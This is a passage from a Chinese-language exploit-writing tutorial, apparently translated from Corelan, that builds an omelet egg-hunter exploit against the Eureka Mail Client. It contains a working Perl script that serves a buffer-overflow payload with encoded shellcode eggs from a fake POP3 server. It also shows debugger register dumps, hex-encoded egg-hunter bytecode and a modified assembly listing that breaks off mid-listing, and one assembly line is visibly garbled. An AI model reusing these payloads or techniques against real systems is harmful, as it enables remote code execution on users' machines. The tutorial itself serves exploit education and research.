"\x45\x50\x4C\x4B\x47\x35\x47\x4C\x4C\x4B\x43\x4C\x43\x35\x43\x48\x45".
"\x51\x4A\x4F\x4C\x4B\x50\x4F\x42\x38\x4C\x4B\x51\x4F\x47\x50\x43\x31".
"\x4A\x4B\x51\x59\x4C\x4B\x46\x54\x4C\x4B\x43";
my $egg2 = "\x7A\xFE\x55\xDA\xBA\x31\x4A\x4E\x50\x31\x49\x50\x4C\x59".
"\x4E\x4C\x4C\x44\x49\x50\x43\x44\x43\x37\x49\x51\x49\x5A\x44\x4D\x43".
"\x31\x49\x52\x4A\x4B\x4A\x54\x47\x4B\x51\x44\x46\x44\x43\x34\x42\x55".
"\x4B\x55\x4C\x4B\x51\x4F\x51\x34\x45\x51\x4A\x4B\x42\x46\x4C\x4B\x44".
"\x4C\x50\x4B\x4C\x4B\x51\x4F\x45\x4C\x45\x51\x4A\x4B\x4C\x4B\x45\x4C".
"\x4C\x4B\x45\x51\x4A\x4B\x4D\x59\x51\x4C\x47\x54\x43\x34\x48\x43\x51".
"\x4F\x46\x51\x4B\x46\x43\x50\x50\x56\x45\x34\x4C\x4B\x47\x36\x50\x30".
"\x4C\x4B\x51\x50\x44\x4C\x4C\x4B\x44\x30\x45";
my $egg3 = "\x7A\xFD\x55\xDA\xBA\x4C\x4E\x4D\x4C\x4B\x45\x38\x43\x38".
"\x4B\x39\x4A\x58\x4C\x43\x49\x50\x42\x4A\x50\x50\x42\x48\x4C\x30\x4D".
"\x5A\x43\x34\x51\x4F\x45\x38\x4A\x38\x4B\x4E\x4D\x5A\x44\x4E\x46\x37".
"\x4B\x4F\x4D\x37\x42\x43\x45\x31\x42\x4C\x42\x43\x45\x50\x41\x41\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40".
"\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
my $garbage="This is a bunch of garbage" x 10;
my $payload=$junk.$ret.$omelet_code.$padding.$egg1.$garbage.$egg2.$garbage.$egg3;
print "Payload : " . length($payload)." bytes\n";
print "Omelet code : " . length($omelet_code)." bytes\n";
print " Egg 1 : " . length($egg1)." bytes\n";
print " Egg 2 : " . length($egg2)." bytes\n";
print " Egg 3 : " . length($egg3)." bytes\n";
#set up listener on port 110
my $port=110;
my $proto=getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr=sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listening on tcp port 110 [POP3]... \n";
print "[+] Configure Eureka Mail Client to connect to this host \n";
my $client_addr;
while($client_addr=accept(CLIENT,SERVER))
{
print "[+] Client connected, sending evil payload\n";
while(1)
{
print CLIENT "-ERR ".$payload."\n";
print " -> Sent ".length($payload)." bytes\n";
}
}
close CLIENT;
print "[+] Connection closed\n";
运行脚本：
C:\sploits\eureka>perl corelan_eurekasploit4.pl
Payload : 2700 bytes
Omelet code : 85 bytes
Egg 1 : 127 bytes
Egg 2 : 127 bytes
Egg 3 : 127 bytes
[+] Listening on tcp port 110 [POP3]...
[+] Configure Eureka Mail Client to connect to this host
结果产生了异常：Access Violation when reading [00000000]
仔细的查看下代码，我们发现摊煎饼代码把00000000放在了寄存器EDI中(\x31\xFF=XOR EDI, EDI).当开始读取
EDI处的地址时，产生了访问冲突(access violation).尽管代码使用了SHE注入来处理访问冲突，但是这一个没有
没处理，所以这次Exploit失败了
在jmp esp处下断点(0x7E47BCAF)并再次进行exploit.当jmp esp执行后，查看寄存器的值
现在来让我们来消灭这个问题。从定位内存中的小块代码片段开始，毕竟，通过利用寄存器的值和那些小块代
码在内存中的位置，我们把一个合适的值赋给EDI, 摊煎饼式的寻蛋代码就可以正确的工作。
首先把3小块代码写到文件中。（把下面几行代码添加到Exploit代码中，放在建立监听器的代码前面）
print FILE $egg1;
close(FILE);
open(FILE,">c:\\tmp\\egg2.bin");
print FILE $egg2;
close(FILE);
open(FILE,">c:\\tmp\\egg3.bin");
print FILE $egg3;
close(FILE);
在jmp esp断点触发时，运行下面的命令：
!pvefindaddr compare c:\tmp\egg1.bin
!pvefindaddr compare c:\tmp\egg2.bin
!pvefindaddr compare c:\tmp\egg3.bin
OK,3个代码块在内存中的位置都被计算出来了，并且者个代码块都没有被破坏。
观察这些地址。一份拷贝在栈上(0x0012????),其他拷贝在内存中(0x0047????).再来看寄存器的值。考虑到我们
需要一个可靠的位于小块代码之前的值。
EAX 00000000
ECX 7C91005D ntdll.7C91005D
EDX 00140608
EBX 00450266 Eureka_E.00450266
ESP 0012CD6C
EBP 00475BFC Eureka_E.00475BFC
ESI 00475BF8 Eureka_E.00475BF8
EDI 00473678 ASCII "AAAAAAAAAAAAA"
EIP 0012CD6C
C 0 ES 0023 32bit 0(FFFFFFFF)
P 0 CS 001B 32bit 0(FFFFFFFF)
A 0 SS 0023 32bit 0(FFFFFFFF)
Z 0 DS 0023 32bit 0(FFFFFFFF)
S 0 FS 003B 32bit 7FFDF000(FFF)
T 0 GS 0000 NULL
D 0
O 0 LastErr ERROR_INVALID_WINDOW_HANDLE (00000578)
EFL 00000202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty -UNORM FB18 00000202 0000001B
ST1 empty -UNORM B7FC 00000000 F894BBD0
ST2 empty -UNORM A70E 06D90000 0120027F
ST3 empty +UNORM 1F80 00400000 BF8131CE
ST4 empty %#.19L
ST5 empty -UNORM CCB4 00000286 0000001B
ST6 empty 9.5000000000000000000
ST7 empty 19.000000000000000000
3 2 1 0 E S P U O Z D I
FST 0120 Cond 0 0 0 1 Err 0 0 1 0 0 0 0 0 (LT)
FCW 027F Prec NEAR,53 Mask 1 1 1 1 1 1
EBX 使个不错的选择，不过显然 EDI 中的值更好。这意味着我们只需保留 EDI 的当前值就可以重定位寻蛋代码
的搜索地址. 快速修复方案：把xor edi, edi指令用两个nop替换即可。
修改后的exploit如下：
my $omelet_code = "\x90\x90\xEB\x23\x51\x64\x89\x20\xFC\xB0\x7A\xF2".
"\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59".
"\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08".
"\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF".
"\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x06\x97\xE9\xD8".
"\xFF\xFF\xFF\x31\xC0\x64\xFF\x50\x08";
再次运行exploit（Eurekar仍运行在Immunity调试器中，并在jmp esp下断点）。当程序中断后，按F7单步执
行。应该看到寻蛋代码开始执行（这次应该看到2个nop），然后指令REPNE SCAS BYTE PTR ES:[EDI]将执行
直到一个小代码块被找到。
根据“!pvefindaddr compare c:\tmp\egg1.bin”命令的结果，应该在地址0x00473C5C上找到第
一个代码块。
当第一个标记找到（并被验证是正确的）后，一个在栈上的地址 被计算出来(我的机器上这个值是0x00126000),
标记后的shellcode代码被拷贝到这个位置。这里使用ECX做递减计数器，直到ECX的值降为0，拷贝才完成，然后
寻蛋代码继续执行。
当第一份小代码块被拷贝后，寻蛋代码继续搜索第二快代码。
这个过程持续到所有的小代码块被找到并被拷贝到栈上。我们看到寻蛋代码并没有停止而是继续搜索内存，结
果我们再次遇到了访问冲突异常。
现在我们直到寻蛋代码执行正常（找到了内存中的所有小代码块），但是却没能适可而止。首先验证内存中的
shellcode是不是真的是原始的拷贝。
我们有先前生成的shellcode.bin文件。把它拷贝到C:\tmp目录。然后在Immunity中执行下列命令：
!pvefindaddr compare c:\tmp\shellcode.bin
Ok，在 0x00126000 处找到了完整的没有修改过的 shellcode。太好了，因为这证明寻蛋代码工作正常。它仅仅
是没有及时停止，结果阴沟里翻船。
修正最后的Bug.
既然代码片段在内存中按正确的顺序出现，也许对寻蛋代码进行简单的修改就可以使代码工作正常。如果我们
使用一个寄存器来保存剩余的小代码块的数目，那么当寄存器表明所有的小代码块都被找到后就让寻蛋代码跳转到
shellcode。
来尝试以下。（虽然我不是汇编语言专家，但是我觉得今天是我的幸运日）。
我们需要在寻蛋代码开始时创造一个起始值用来记录寻到的小代码块数（0 减去小代码块的数目或者
0xFFFFFFFF 减去小代码块的数目加 1， 当小代码块数为 3 时，我们使用 0xFFFFFFFD）。在调试器中观察寻蛋代码，
可以发现EBX寄存器没有被使用。所以我们把这个值保存在EBX中。
下一步，我们要对寻蛋代码做以下改造。每找到一个小代码块，我们就把计数器加1.当计数器的值为0xFFFFFFFF,
表明所有的代码块都已经找到了，该进行跳转了。
把0xFFFFFFFD放在EBX的操作码是0xbb\xfd\xff\xff\xff,所以我们把这几条指令放在寻蛋代码的开始位置。
然后，每次把小代码块中的shellcode代码拷贝到栈上后，我们就检查是否已经找到了所有的小代码块。如果
EBX 的值等于 0xFFFFFFFF，就跳转到 shellcode,否则就增加 EBX。拷贝 shellcode 到栈上的指令是:F3:A4,所以检
查和增加EBX的指令应该放在这个指令后面。
在这个指令后面，我们将增加比较、相等则跳转和增加EBX的指令。
让我们修改汇编代码：
BITS 32
; egg:
; LL II M1 M2 M3 DD DD DD ... (LL * DD)
; LL == Size of eggs (same for all eggs)
; II == Index of egg (different for each egg)
; M1,M2,M3 == Marker byte (same for all eggs)
; DD == Data in egg (different for each egg)
; Original code by skylined
; Code tweaked by Peter Van Eeckhoutte
; peter.ve[at]corelan.be
; http://www.corelan.be:8800
marker equ 0x280876
egg_size equ 0x3
max_index equ 0x2
start:
mov ebx,0xffffffff-egg_size+1 ; ** Added : put initial counter in EBX
jmp SHORT reset_stack
create_SEH_handler:
PUSH ECX ; SEH_frames[0].nextframe == 0xFFFFFFFF
MOV [FS:EAX], ESP ; SEH_chain -> SEH_frames[0]
CLD ; SCAN memory upwards from 0
scan_loop:
MOV AL, egg_size ; EAX = egg_size
egg_size_location equ $-1 - $$
REPNE SCASB ; Find the first byte
PUSH EAX ; Save egg_size
MOV ESI, EDI
LODSD ; EAX = II M2 M3 M4
XOR EAX, (marker  This was not a marker, continue scan
POP ECX ; ECX = egg_size
IMUL ECX ; EAX = egg_size * egg_index == egg_offset
; EDX = 0 because ECX * EAX is always less than 0x1,000,000
ADD EAX, [BYTE FS:EDX + 8] ; EDI += Bottom of stack ==
; position of egg in shellcode.
XCHG EAX, EDI
copy_loop:
REP MOVSB ; copy egg to basket
CMP EBX, 0xFFFFFFFF ; ** Added : see if we have found all eggs